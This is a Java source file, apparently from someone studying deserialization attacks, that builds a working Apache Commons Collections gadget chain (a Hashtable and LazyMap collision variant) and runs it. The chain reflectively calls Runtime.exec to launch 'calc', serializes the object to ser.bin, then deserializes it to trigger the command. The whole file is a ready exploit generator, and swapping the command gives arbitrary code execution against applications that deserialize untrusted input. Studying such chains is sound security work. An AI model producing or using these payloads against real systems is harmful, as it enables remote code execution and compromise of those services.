import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

// AbstractMap 的 EXP
public class AbstractMapEXP {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        Map decorateMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
        decorateMap1.put("yy", 1);
        Map decorateMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        decorateMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(decorateMap1, 1);
        hashtable.put(decorateMap2, 1);
        Class c = ChainedTransformer.class;
        Field field = c.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        decorateMap2.remove("yy");

        serialize(hashtable);
        unserialize("ser.bin");
    }
        public static void serialize(Object obj) throws IOException {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
            oos.writeObject(obj);
        }
        public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
            Object obj = ois.readObject();
            return obj;
        }
}
